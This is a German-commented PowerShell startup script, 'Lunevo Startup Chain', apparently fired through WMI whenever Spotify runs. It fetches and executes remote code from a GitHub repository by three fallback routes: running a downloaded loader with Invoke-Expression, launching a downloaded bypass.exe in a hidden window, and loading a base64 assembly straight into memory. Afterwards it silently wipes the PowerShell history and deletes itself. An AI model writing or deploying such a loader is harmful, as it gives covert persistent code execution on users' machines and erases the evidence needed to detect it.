# Lunevo Startup Chain
# Wird automatisch ausgeführt wenn Spotify geöffnet wird

Start-Sleep -Seconds 2

# Prüfe ob Spotify läuft
$spotifyRunning = Get-Process -Name "Spotify" -ErrorAction SilentlyContinue

if ($spotifyRunning) {
    # Spotify läuft - Starte Bypass fileless
    
    # Prüfe ob Bypass bereits läuft (verhindert mehrfaches Starten)
    $bypassRunning = Get-Process -Name "bypass" -ErrorAction SilentlyContinue
    if ($bypassRunning) {
        exit
    }
    
    # Option 1: PowerShell Loader (fileless)
    $loaderUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/loader.ps1"
    try {
        $loader = Invoke-WebRequest -Uri $loaderUrl -UseBasicParsing -ErrorAction Stop
        Invoke-Expression $loader.Content
    } catch {
        # Option 2: Fallback - Download EXE und starte
        $exeUrl = "https://raw.githubusercontent.com/lunevo/lunevo/main/bypass.exe"
        $exePath = "$env:TEMP\Lunevo\bypass.exe"
        
        # Erstelle Verzeichnis falls nicht vorhanden
        $exeDir = Split-Path -Parent $exePath
        if (-not (Test-Path $exeDir)) {
            New-Item -ItemType Directory -Path $exeDir -Force | Out-Null
        }
        
        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
            if (Test-Path $exePath) {
                Start-Process -FilePath $exePath -WindowStyle Hidden
            }
        } catch {
            # Option 3: Base64-encoded Payload (vollständig fileless)
            $base64Url = "https://raw.githubusercontent.com/lunevo/lunevo/main/payload.b64"
            try {
                $base64 = Invoke-WebRequest -Uri $base64Url -UseBasicParsing -ErrorAction Stop
                $bytes = [Convert]::FromBase64String($base64.Content.Trim())
                $assembly = [System.Reflection.Assembly]::Load($bytes)
                $entryPoint = $assembly.EntryPoint
                if ($entryPoint) {
                    $entryPoint.Invoke($null, @())
                }
            } catch {
                # Silent fail
            }
        }
    }
}

# Silent Log Cleaning (minimal, unauffällig)
try {
    # PowerShell History
    $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($historyPath -and (Test-Path $historyPath)) {
        Clear-Content -Path $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    # Lösche diese Datei selbst (wird von WMI aufgerufen)
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath -and (Test-Path $scriptPath)) {
        Start-Sleep -Milliseconds 500
        Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
} catch {
    # Silent
}

